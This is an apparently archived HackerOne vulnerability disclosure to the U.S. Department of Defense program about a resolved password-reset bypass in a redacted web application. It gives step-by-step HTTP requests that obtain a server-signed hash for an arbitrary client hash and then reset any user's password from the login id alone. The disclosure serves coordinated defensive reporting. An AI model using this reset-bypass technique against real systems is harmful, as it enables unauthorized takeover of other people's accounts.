---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
date: 2020-05-11
submitted: 2019-05-04T23:06:13.482Z
bounty_usd: null
votes: 26
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "cablej_dds"
source: "https://hackerone.com/reports/566811"
title: "████ - Complete account takeover"
---
# ████ - Complete account takeover

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 26 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-05-11

- Report: [https://hackerone.com/reports/566811](https://hackerone.com/reports/566811)
- CWE: Improper Authentication - Generic
- Submitted: 2019-05-04T23:06:13.482Z

## Timeline

- **Report Filed**
- **2019-05-04** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-05-05** @cablej_dds: As of now, ████ is back online after being taken down. Some changes have been made to attempt addressing this issue. However, it is possible to bypass these changes and still reset a password for any account given only the login id.

Summary of changes:

█████ added required `ClientHash` and `ServerHash` parameters to the forgot password endpoint. From what I could tell, ClientHash is an md5 hash of the responses to the security questions, and ServerHash is a MAC that computes server-side an authenticated hash of the ClientHash. However, the `/api/session/personalsettings/checkpasswordresetquestions` endpoint returns ServerHash for any arbitrary ClientHash, and further the forgot password endpoint only checks if ServerHash was properly generated from ClientHash. Thus, it is possible to provide an arbitrary ClientHash and ServerHash and still proceed with the above attack.

Steps to reproduce:

1) Make the following request to `/api/session/personalsettings/checkpasswordresetquestions`, updating cookies as described in the original report if necessary:

```
POST /api/session/personalsettings/checkpasswordresetquestions HTTP/1.1
Host: ████
Connection: close
Content-Length: 85
Accept: application/json, text/plain, */*
Origin: https://█████████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Type: application/json
Referer: https://███/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: V7jzrRgqOnfycG9hpvw59A%3d%3d=███; M%2fq7ofHjaGF5c8fliUg6XA%3d%3d=███; VKPref=NONE; fr33FKVLUGclAp0oxHXQyA%3d%3d=█████; BIGipServer██████████.app~██████████_pool=█████; LastMRH_Session=█████████; F5_ST=█████; MRHSession=█████████; TS01b5a2de=███

{"Login":"x","ResetQuestions":{"7":"test","19":"test","23":"tesft"},"ClientHash":"0"}
```

2) The server will return `{"ServerHash":"████"}`, which is the server-side hash of the provided ClientHash.

3) Make the following request to `/api/session/personalsettings/ForgotPasswordReset`, updating cookies if necessary:

```
POST /api/session/personalsettings/ForgotPasswordReset HTTP/1.1
Host: ████████
Connection: close
Content-Length: 215
Accept: application/json, text/plain, */*
Origin: https://███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Type: application/json
Referer: https://██████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: V7jzrRgqOnfycG9hpvw59A%3d%3d=███████; M%2fq7ofHjaGF5c8fliUg6XA%3d%3d=██████; VKPref=NONE; fr33FKVLUGclAp0oxHXQyA%3d%3d=█████████; BIGipServer█████.app~█████_pool=██████; LastMRH_Session=█████████; F5_ST=█████; MRHSession=█████████; TS01b5a2de=███

{"Username":"x","Password":"new_pass","IsLimitedAccessAccount":false,"ClientHash":"0","ServerHash":"███████"}
```

(Note that the ClientHash and ServerHash from the previous request are already in the body, so these should not be necessary to update)

4) The user's password will be updated and you may log in as usual.

Thanks.
- **Report Severity Updated**
- **Report Triaged**
- **Report Needs More Info**
- **Report New**
- **2019-05-23** @ag3nt-j1: Thanks █████, appreciate it.
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2019-12-09** @agent-r5: We will put it in the queue for disclosure.
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
